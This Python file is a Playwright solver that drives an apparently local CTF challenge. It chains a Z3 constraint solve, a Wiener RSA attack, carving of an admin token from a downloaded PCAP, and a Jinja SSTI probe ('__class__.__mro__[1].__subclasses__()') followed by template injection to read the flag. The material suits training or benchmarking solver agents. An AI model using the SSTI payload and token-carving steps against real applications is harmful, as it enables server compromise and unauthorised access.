"""
Apex Gauntlet - Full Interactive Playwright Browser Solver
==========================================================
Simulates an authentic human/agent black-box CTF participant:
1. Navigates to http://127.0.0.1:8099/ via Playwright Chromium.
2. Interacts with the UI: Clicks buttons, fills forms, listens to console events.
3. Dynamically extracts constraints from the DOM terminal and invokes Z3.
4. Reads RSA parameters from the webpage, invokes Wiener cryptanalysis.
5. Captures real browser file download (apex_traffic.pcap) via page.expect_download().
6. Dissects the PCAP using ForensicEngine, carves the admin token.
7. Types the carved signature into the UI form, tests WAF blocking, then bypasses it.
8. Reads the Master Flag directly from the rendered webpage banner and takes a screenshot.
"""

import os
import sys
import json
import time
import re
from pathlib import Path

# Setup paths
SOLVER_DIR = Path(__file__).resolve().parent
REPO_ROOT = SOLVER_DIR.parent.parent.parent
sys.path.insert(0, str(REPO_ROOT))

from playwright.sync_api import sync_playwright
from agent import execute_tool

TARGET_URL = os.environ.get("APEX_TARGET", "http://127.0.0.1:8099/")
ARTIFACTS_DIR = SOLVER_DIR.parent / "artifacts"
ARTIFACTS_DIR.mkdir(parents=True, exist_ok=True)
VICTORY_SCREENSHOT = ARTIFACTS_DIR / "apex_gauntlet_victory_proof.png"

def run_interactive_solver():
    print(f"\n{'='*75}")
    print(f"[*] LAUNCHING INTERACTIVE PLAYWRIGHT CTF AGENT -> {TARGET_URL}")
    print(f"{'='*75}\n")

    start_time = time.time()

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        context = browser.new_context(accept_downloads=True)
        page = context.new_page()

        console_logs = []
        page.on("console", lambda msg: console_logs.append(msg.text))

        # --- STEP 1: LOAD CHALLENGE & INITIALIZE SHIELD ---
        print("[+] [STEP 1] Navigating to challenge URL...")
        page.goto(TARGET_URL, timeout=15000)
        page.wait_for_timeout(600)

        print("[+] [STEP 1] Clicking '#btn-init-nexus' to trigger memory shield...")
        page.click("#btn-init-nexus")
        page.wait_for_selector("#stage1-box.unlocked", timeout=5000)
        token_text = page.text_content("#label-stage1-token")
        print(f"[✓] [STEP 1 COMPLETE] Quantum Shield Authenticated: {token_text}")

        # --- STEP 2: FETCH SMT CONSTRAINTS & SOLVE VIA Z3 ---
        print("\n[+] [STEP 2] Clicking '#btn-fetch-spec' to load constraint equations...")
        page.click("#btn-fetch-spec")
        page.wait_for_selector("#code-stage2-spec", state="visible", timeout=5000)
        raw_constraints = page.text_content("#code-stage2-spec")
        print(f"[+] [STEP 2] Extracted {len(raw_constraints)} chars of constraints from DOM.")

        print("[+] [STEP 2] Invoking symbolic_execution_solver (Z3 BitVec)...")
        z3_out = execute_tool("symbolic_execution_solver", {
            "constraints": raw_constraints,
            "target_var": "flag",
            "length": 16
        })
        z3_res = json.loads(z3_out)
        passcode = z3_res.get("solved_string")
        print(f"[✓] [STEP 2 SOLVED] Z3 Passcode: '{passcode}'")

        print("[+] [STEP 2] Typing passcode into '#input-stage2-passcode' and submitting...")
        page.fill("#input-stage2-passcode", passcode)
        page.click("#btn-submit-stage2")
        page.wait_for_selector("#stage2-box.unlocked", timeout=5000)
        print("[✓] [STEP 2 COMPLETE] Reversing Gate Unlocked!")

        # --- STEP 3: READ RSA PARAMS & WIENER FACTORIZATION ---
        print("\n[+] [STEP 3] Reading public RSA parameters from '#code-stage3-spec'...")
        page.wait_for_selector("#code-stage3-spec", state="visible", timeout=5000)
        crypto_text = page.text_content("#code-stage3-spec")
        
        n_match = re.search(r"N\s*=\s*(\d+)", crypto_text)
        e_match = re.search(r"e\s*=\s*(\d+)", crypto_text)
        c_match = re.search(r"c\s*=\s*(\d+)", crypto_text)
        if not (n_match and e_match and c_match):
            raise RuntimeError(f"[-] Could not parse RSA params from text:\n{crypto_text}")

        N_val = n_match.group(1)
        e_val = e_match.group(1)
        c_val = c_match.group(1)
        print(f"[+] [STEP 3] Parsed N={N_val[:20]}..., e={e_val[:20]}..., c={c_val[:20]}...")

        print("[+] [STEP 3] Invoking advanced_crypto_solver (Wiener continued fractions)...")
        crypto_out = execute_tool("advanced_crypto_solver", {
            "attack": "wiener",
            "n": N_val,
            "e": e_val,
            "c": c_val
        })
        crypto_res = json.loads(crypto_out)
        decrypted_key = crypto_res["wiener"]["plaintext_bytes"]
        print(f"[✓] [STEP 3 SOLVED] Decrypted RSA Key: '{decrypted_key}'")

        print("[+] [STEP 3] Typing decrypted key into '#input-stage3-key' and submitting...")
        page.fill("#input-stage3-key", decrypted_key)
        page.click("#btn-submit-stage3")
        page.wait_for_selector("#stage3-box.unlocked", timeout=5000)
        print("[✓] [STEP 3 COMPLETE] Cryptanalysis Chamber Cleared!")

        # --- STEP 4: INTERCEPT REAL BROWSER DOWNLOAD & CARVE PCAP ---
        print("\n[+] [STEP 4] Intercepting browser file download for 'apex_traffic.pcap'...")
        download_path = ARTIFACTS_DIR / "browser_downloaded_traffic.pcap"
        with page.expect_download() as download_info:
            page.click("#link-download-pcap")
        download = download_info.value
        download.save_as(str(download_path))
        print(f"[✓] [STEP 4] Browser saved {download_path.stat().st_size} bytes to {download_path}")

        print("[+] [STEP 4] Invoking run_forensics_inspection on downloaded PCAP...")
        forensic_out = execute_tool("run_forensics_inspection", {"file_path": str(download_path)})
        forensic_res = json.loads(forensic_out)
        
        net_results = forensic_res["categories"]["network_forensics"]["results"][0]
        http_transfers = net_results["evidence"]["http_transfers"]
        admin_signature = None
        for item in http_transfers:
            if item.get("filename") == "admin_waf_token.txt":
                admin_signature = item.get("content_preview")
                break
        if not admin_signature:
            raise RuntimeError(f"[-] Stage 4 Failed: Could not carve token: {http_transfers}")
        print(f"[✓] [STEP 4 SOLVED] Carved Admin Signature: '{admin_signature}'")

        print("[+] [STEP 4] Typing signature into '#input-stage4-signature' and submitting...")
        page.fill("#input-stage4-signature", admin_signature)
        page.click("#btn-submit-stage4")
        page.wait_for_selector("#stage4-box.unlocked", timeout=5000)
        print("[✓] [STEP 4 COMPLETE] Forensic Admin Authenticated!")

        # --- STEP 5: TEST WAF DEFENSE & RECOVER MASTER FLAG ---
        print("\n[+] [STEP 5] Testing WAF Sentinel block with malicious RCE payload...")
        page.fill("#input-stage5-template", "{{ ''.__class__.__mro__[1].__subclasses__() }}")
        page.click("#btn-submit-stage5")
        page.wait_for_timeout(500)
        waf_text = page.text_content("#output-stage5-audit")
        print(f"[✓] [STEP 5] Verified WAF Block Output: {waf_text.strip()}")

        print("[+] [STEP 5] Submitting sanitized SSTI context interpolation: '{{ vault_flag }}'...")
        page.fill("#input-stage5-template", "AUDIT_VERIFIED: {{ vault_flag }}")
        page.click("#btn-submit-stage5")
        
        page.wait_for_selector("#master-flag-banner", state="visible", timeout=6000)
        master_flag = page.text_content("#master-flag-display").strip()
        print(f"\n{'*'*75}")
        print(f"[★] VICTORY! MASTER FLAG READ DIRECTLY FROM WEBPAGE DISPLAY:")
        print(f"    {master_flag}")
        print(f"{'*'*75}")

        # Capture final proof screenshot of victory state
        page.screenshot(path=str(VICTORY_SCREENSHOT), full_page=True)
        print(f"[+] [PROOF] Saved full-page victory screenshot to {VICTORY_SCREENSHOT}")

        browser.close()

    elapsed = time.time() - start_time
    print(f"\n[+] Total interactive Playwright solve time: {elapsed:.2f} seconds.")
    return master_flag

if __name__ == "__main__":
    run_interactive_solver()
